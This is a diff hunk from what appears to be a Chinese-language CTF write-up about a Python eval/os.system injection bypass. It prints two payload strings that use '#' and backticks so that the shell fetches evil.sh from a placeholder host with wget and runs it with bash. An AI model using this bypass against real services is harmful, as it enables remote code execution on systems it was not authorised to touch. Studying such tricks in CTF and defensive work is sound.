@@ -367,8 +367,8 @@ os.system的时候#注释后面内容 cat这个语句被执行
 
 来自vidar summer师傅的思路
 
-num = "1+1#`wget\thttp://x.x.x.x:60056/evil.sh`"
-num = "1+1#`bash\tevil.sh`"
+num = "1+1#\`wget\thttp://x.x.x.x:60056/evil.sh\`"
+num = "1+1#\`bash\tevil.sh\`"
 
 这里#在python中确实会注释后面的内容，eval不会报错因为反引号内容被注释了，但是在os.system里面由于#在双引号中，反引号里面的内容在shell里代码会被执行，#只会被当作一个字符，这点非常神奇，学习了两位师傅的解法后发现都用了#去绕过，但是具体的利用方式也不一样，非常巧妙，学到了很多。
 
